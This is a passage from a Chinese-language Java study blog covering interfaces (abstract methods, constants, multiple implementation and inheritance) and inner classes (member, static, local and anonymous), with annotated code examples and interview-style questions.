<li>接口不能创建对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口的定义格式：</span></span><br><span class="line">interface 接口名称&#123;</span><br><span class="line">    <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口的声明：interface</span></span><br><span class="line"><span class="comment">// 接口名称：首字母大写，满足“驼峰模式”</span></span><br></pre></td></tr></table></figure>
<h4 id="接口成分的特点"><a class="header-anchor" href="#接口成分的特点">¶</a>接口成分的特点</h4>
<h5 id="抽象方法-v2"><a class="header-anchor" href="#抽象方法-v2">¶</a>抽象方法</h5>
<ul>
<li>接口中的抽象方法默认会自动加上public abstract修饰，无需自己手写</li>
</ul>
<h5 id="常量"><a class="header-anchor" href="#常量">¶</a>常量</h5>
<ul>
<li>
<p>在接口中定义的成员变量默认会加上： public static final修饰</p>
</li>
<li>
<p>在接口中定义的成员变量实际上是一个常量。使用public static final修饰后，变量值就不可被修改</p>
</li>
<li>
<p>并且是静态化的变量可以直接用接口名访问，所以也叫常量</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterF</span> &#123;</span><br><span class="line">    <span class="comment">// 抽象方法！</span></span><br><span class="line">    <span class="comment">//    public abstract void run();</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public abstract String getName();</span></span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    public abstract int add(int a , int b);</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a , <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 它的最终写法是：</span></span><br><span class="line">    <span class="comment">// public static final int AGE = 12 ;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">AGE</span>  <span class="operator">=</span> <span class="number">12</span>; <span class="comment">//常量</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">SCHOOL_NAME</span> <span class="operator">=</span> <span class="string">&quot;黑马程序员&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="基本的实现"><a class="header-anchor" href="#基本的实现">¶</a>基本的实现</h4>
<ul>
<li>类与接口的关系为实现关系，即<strong>类实现接口</strong>，该类可以称为接口的[实现类]，也可以称为接口的[子类]</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**接口的实现：</span></span><br><span class="line"><span class="comment">    在Java中接口是被实现的，实现接口的类称为实现类。</span></span><br><span class="line"><span class="comment">    实现类的格式:*/</span></span><br><span class="line">class 类名 implements 接口<span class="number">1</span>,接口<span class="number">2</span>,接口<span class="number">3.</span>..&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="类实现接口的要求和意义"><a class="header-anchor" href="#类实现接口的要求和意义">¶</a>类实现接口的要求和意义</h5>
<ol>
<li>必须重写实现的全部接口中所有抽象方法。</li>
<li>如果一个类实现了接口，但是没有重写完全部接口的全部抽象方法，这个类也必须定义成抽象类。</li>
<li><strong>意义：接口体现的是一种【规范】，接口对实现类是一种【强制性的约束】，要么全部完成接口申明的功能，要么自己也定义成抽象类。这正是一种强制性的规范</strong></li>
</ol>
<h5 id="类实现接口基本案例"><a class="header-anchor" href="#类实现接口基本案例">¶</a>类实现接口基本案例</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   接口：接口体现的是规范。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>; <span class="comment">// 抽象方法，跑步。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">law</span><span class="params">()</span>; <span class="comment">// 抽象方法，遵守法律。</span></span><br><span class="line">    String <span class="title function_">compittion</span><span class="params">(String project)</span>;  <span class="comment">// 抽象方法，比赛。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*接口的实现：</span></span><br><span class="line"><span class="comment">*在Java中接口是被实现的，实现接口的类称为实现类。</span></span><br><span class="line"><span class="comment">*实现类的格式:</span></span><br><span class="line"><span class="comment">*     class 类名 implements 接口1,接口2,接口3...&#123;...&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PingPongMan</span>  <span class="keyword">implements</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;乒乓球运动员稍微跑一下！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">law</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;乒乓球运动员守法！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">compittion</span><span class="params">(String project)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;参加&quot;</span> + project + <span class="string">&quot;得金牌！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建实现类对象。</span></span><br><span class="line">        <span class="type">PingPongMan</span> <span class="variable">zjk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PingPongMan</span>();</span><br><span class="line">        zjk.run();</span><br><span class="line">        zjk.law();</span><br><span class="line">        System.out.println(zjk.compittion(<span class="string">&quot;全球乒乓球比赛&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="类与接口多实现案例"><a class="header-anchor" href="#类与接口多实现案例">¶</a>类与接口多实现案例</h5>
<ul>
<li><strong>类与接口之间的关系是多实现的，一个类可以同时实现多个接口</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 法律规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Law</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 这一个运动员的规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*Java中接口是可以被多实现的：</span></span><br><span class="line"><span class="comment">*一个类可以实现多个接口: Law, SportMan</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JumpMan</span> <span class="keyword">implements</span> <span class="title class_">Law</span> ,SportMan &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;尊长守法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;训练跑步！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*Java中接口是可以被多实现的：</span></span><br><span class="line"><span class="comment">*一个类可以实现多个接口: Law, SportMan</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JumpMan</span> <span class="keyword">implements</span> <span class="title class_">Law</span> ,SportMan &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;尊长守法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;训练跑步！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="接口与接口的多继承（没太懂-）"><a class="header-anchor" href="#接口与接口的多继承（没太懂-）">¶</a>接口与接口的多继承（没太懂= =）</h4>
<ul>
<li>
<p>接口与接口之间是可以多继承的</p>
</li>
<li>
<p>注意：<strong>类与接口是实现关系，接口与接口是继承关系</strong></p>
</li>
<li>
<p>接口继承接口就是把其他接口的抽象方法与本接口进行了合并</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Abc</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">go</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 法律规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Law</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> *</span><br><span class="line"> *总结：</span><br><span class="line"> *    接口与类之间是多实现的。</span><br><span class="line"> *    接口与接口之间是多继承的。</span><br><span class="line"> * */</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> <span class="keyword">extends</span> <span class="title class_">Law</span> , Abc &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="扩展：接口的细节"><a class="header-anchor" href="#扩展：接口的细节">¶</a>扩展：接口的细节</h4>
<ul>
<li>会用就行，报错时懂得修改</li>
</ul>
<ol>
<li>当两个接口中存在相同抽象方法的时候，该怎么办？</li>
</ol>
<blockquote>
<p>只要重写一次即可。此时重写的方法，既表示重写1接口的，也表示重写2接口的。</p>
</blockquote>
<ol start="2">
<li>实现类能不能继承A类的时候，同时实现其他接口呢？</li>
</ol>
<blockquote>
<p>继承的父类，就好比是亲爸爸一样</p>
<p>实现的接口，就好比是干爹一样</p>
<p>可以继承一个类的同时，再实现多个接口，只不过，要把接口里面所有的抽象方法，全部实现。</p>
</blockquote>
<ol start="3">
<li>实现类能不能继承一个抽象类的时候，同时实现其他接口呢？</li>
</ol>
<blockquote>
<p>实现类可以继承一个抽象类的同时，再实现其他多个接口，只不过要把里面所有的抽象方法全部重写。</p>
</blockquote>
<ol start="4">
<li>实现类Zi，实现了一个接口，还继承了一个Fu类。假设在接口中有一个方法，父类中也有一个相同的方法。子类如何操作呢？</li>
</ol>
<blockquote>
<p>处理办法一：如果父类中的方法体，能满足当前业务的需求，在子类中可以不用重写。</p>
<p>处理办法二：如果父类中的方法体，不能满足当前业务的需求，需要在子类中重写。</p>
</blockquote>
<ol start="5">
<li>如果一个接口中，有10个抽象方法，但是我在实现类中，只需要用其中一个，该怎么办?</li>
</ol>
<blockquote>
<p>可以在接口跟实现类中间，新建一个中间类（适配器类）</p>
<p>让这个适配器类去实现接口，对接口里面的所有的方法做空重写。</p>
<p>让子类继承这个适配器类，想要用到哪个方法，就重写哪个方法。</p>
<p>因为中间类没有什么实际的意义，所以一般会把中间类定义为抽象的，不让外界创建对象</p>
</blockquote>
<h3 id="内部类"><a class="header-anchor" href="#内部类">¶</a>内部类</h3>
<ul>
<li>将一个类A定义在另一个类B里面，里面的那个类A就称为<strong>内部类</strong>，B则称为<strong>外部类</strong></li>
<li>可以把内部类理解成寄生，外部类理解成宿主</li>
</ul>
<h4 id="概述-v2"><a class="header-anchor" href="#概述-v2">¶</a>概述</h4>
<ul>
<li>什么时候用内部类：</li>
<li>一个事物内部还有一个独立的事物，内部的事物脱离外部的事物无法独立使用
<ol>
<li>人里面有一颗心脏。</li>
<li>汽车内部有一个发动机。</li>
<li>为了实现更好的封装性。</li>
</ol>
</li>
</ul>
<h4 id="分类-v2"><a class="header-anchor" href="#分类-v2">¶</a>分类</h4>
<ul>
<li>按定义的位置来分</li>
</ul>
<ol>
<li>**成员内部类，类定义在了成员位置 (类中方法外称为成员位置，无static修饰的内部类)</li>
<li><strong>静态内部类</strong>，类定义在了成员位置 (类中方法外称为成员位置，有static修饰的内部类)</li>
<li><strong>局部内部类</strong>，类定义在方法内</li>
<li><strong>匿名内部类</strong>，没有名字的内部类，可以在方法中，也可以在类中方法外。</li>
</ol>
<h4 id="成员内部类"><a class="header-anchor" href="#成员内部类">¶</a>成员内部类</h4>
<h6 id="特点-v2"><a class="header-anchor" href="#特点-v2">¶</a>特点</h6>
<ul>
<li>无static修饰的内部类，属于外部类对象的</li>
<li>宿主：外部类对象</li>
</ul>
<h6 id="使用格式"><a class="header-anchor" href="#使用格式">¶</a>使用格式</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类 <span class="comment">// 访问内部类的类型都是用 外部类.内部类</span></span><br></pre></td></tr></table></figure>
<h6 id="获取成员内部类对象的两种方式"><a class="header-anchor" href="#获取成员内部类对象的两种方式">¶</a><strong>获取成员内部类对象的两种方式</strong></h6>
<p>方式一：外部直接创建成员内部类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类 变量 = <span class="keyword">new</span> 外部类（）.new 内部类（）;</span><br></pre></td></tr></table></figure>
<p>方式二：在外部类中定义一个方法提供内部类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//  宿主：外部类对象。</span></span><br><span class="line">       <span class="comment">// Outer out = new Outer();</span></span><br><span class="line">        <span class="comment">// 创建内部类对象。</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>().<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        oi.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="comment">// 成员内部类，属于外部类对象的。</span></span><br><span class="line">    <span class="comment">// 拓展：成员内部类不能定义静态成员。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="comment">// 这里面的东西与类是完全一样的。</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;内部类中的方法被调用了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方式二：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Inner <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        System.out.println(o.getInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="成员内部类的细节"><a class="header-anchor" href="#成员内部类的细节">¶</a>成员内部类的细节</h4>
<ul>
<li>编写成员内部类的注意点：</li>
</ul>
<ol>
<li>成员内部类可以被一些修饰符所修饰，比如： private，默认，protected，public，static等</li>
<li>在成员内部类里面，JDK16之前不能定义静态变量，JDK16开始才可以定义静态变量。</li>
<li>创建内部类对象时，对象中有一个隐含的Outer.this记录外部类对象的地址值。</li>
</ol>
<h4 id="成员内部类面试题"><a class="header-anchor" href="#成员内部类面试题">¶</a>成员内部类面试题</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer.<span class="type">inner</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>().<span class="keyword">new</span> <span class="title class_">inner</span>();</span><br><span class="line">        oi.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;        <span class="comment">// 外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在成员位置定义一个类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">inner</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">            System.out.println(???);        <span class="comment">// 10   答案：a</span></span><br><span class="line">            System.out.println(???);        <span class="comment">// 20        答案：this.a</span></span><br><span class="line">            System.out.println(???);        <span class="comment">// 30        答案：Outer.this.a</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：内部类访问外部类对象的格式是：<strong>外部类名.this</strong></li>
</ul>
<h4 id="成员内部类内存图"><a class="header-anchor" href="#成员内部类内存图">¶</a>成员内部类内存图</h4>
<ul>
<li>此处缺少一张图</li>
<li>目前技术还不到位</li>
</ul>
<h3 id="静态内部类"><a class="header-anchor" href="#静态内部类">¶</a>静态内部类</h3>
<ul>
<li>一种特殊的成员内部类</li>
<li>有static修饰，属于外部类本身的</li>
<li>总结：静态内部类与其他类的用法完全一样。只是访问的时候需要加上外部类.内部类</li>
<li><strong>拓展1</strong>:静态内部类可以直接访问外部类的静态成员</li>
<li><strong>拓展2</strong>:静态内部类不可以直接访问外部类的非静态成员，如果要访问需要创建外部类的对象</li>
<li><strong>拓展3</strong>:静态内部类中没有银行的Outer.this</li>
</ul>
<h4 id="创建格式"><a class="header-anchor" href="#创建格式">¶</a>创建格式</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类  变量 = <span class="keyword">new</span>  外部类.内部类构造器;</span><br></pre></td></tr></table></figure>
<h4 id="调用方法"><a class="header-anchor" href="#调用方法">¶</a>调用方法</h4>
<ul>
<li>调用非静态方法的格式：先创建对象，用对象调用</li>
<li>调用静态方法的格式：外部类名.内部类名.方法名();</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 外部类：Outer01</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer01</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">String</span> <span class="variable">sc_name</span> <span class="operator">=</span> <span class="string">&quot;黑马程序&quot;</span>;</span><br><span class="line">    <span class="comment">// 内部类: Inner01</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Inner01</span>&#123;</span><br><span class="line">        <span class="comment">// 这里面的东西与类是完全一样的。</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Inner01</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showName</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>.name);</span><br><span class="line">            <span class="comment">// 拓展:静态内部类可以直接访问外部类的静态成员。</span></span><br><span class="line">            System.out.println(sc_name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InnerClassDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建静态内部类对象。</span></span><br><span class="line">        <span class="comment">// 外部类.内部类  变量 = new  外部类.内部类构造器;</span></span><br><span class="line">        Outer01.<span class="type">Inner01</span> <span class="variable">in</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer01</span>.Inner01(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        in.showName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="局部内部类"><a class="header-anchor" href="#局部内部类">¶</a>局部内部类</h3>
<ul>
<li>定义在<strong>方法中</strong>的类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 外部类名 &#123;</span><br><span class="line">  数据类型 变量名;</span><br><span class="line">  修饰符 返回值类型 方法名(参数列表) &#123;</span><br><span class="line">      <span class="comment">// …</span></span><br><span class="line">      class 内部类 &#123;</span><br><span class="line">      <span class="comment">// 成员变量</span></span><br><span class="line">      <span class="comment">// 成员方法</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="【▷】匿名内部类"><a class="header-anchor" href="#【▷】匿名内部类">¶</a>【▷】匿名内部类</h3>
<ul>
<li>开发中最常用到的内部类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 类名或者接口名() &#123;</span><br><span class="line">     重写方法;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>包含了：
<ul>
<li>继承或实现关系</li>
<li>方法重写</li>
<li>创建对象</li>
</ul>
</li>
</ul>
<h4 id="匿名内部类使用场景"><a class="header-anchor" href="#匿名内部类使用场景">¶</a>匿名内部类使用场景</h4>
<ul>
<li>希望定义一个只使用一次的类</li>
<li>本质：简化代码</li>
<li>之前使用接口的步骤：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 定义子类</span><br><span class="line"><span class="number">2.</span> 重写接口中的方法</span><br><span class="line"><span class="number">3.</span> 创建子类对象</span><br><span class="line"><span class="number">4.</span> 调用重写后的方法</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义接口的实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 重写抽象方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗刨式...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 创建实现类对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">// 4. 调用方法</span></span><br><span class="line">        s.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>更快的实现以上四个步骤的方式：匿名内部类</li>
</ul>
<h4 id="匿名内部类前提和格式"><a class="header-anchor" href="#匿名内部类前提和格式">¶</a>匿名内部类前提和格式</h4>
<ul>
<li>必须<strong>继承一个父类</strong>或者<strong>实现一个父接口</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 父类名或者接口名()&#123;</span><br><span class="line">    <span class="comment">// 方法重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="使用方式-v2"><a class="header-anchor" href="#使用方式-v2">¶</a>使用方式</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用匿名内部类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;自由泳...&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;.swimming();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接口 变量 = new 实现类(); // 多态,走子类的重写方法</span></span><br><span class="line">        <span class="type">Swim</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;蛙泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        s2.swimming();</span><br><span class="line">        s2.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="特点-v3"><a class="header-anchor" href="#特点-v3">¶</a>特点</h4>
<ol>
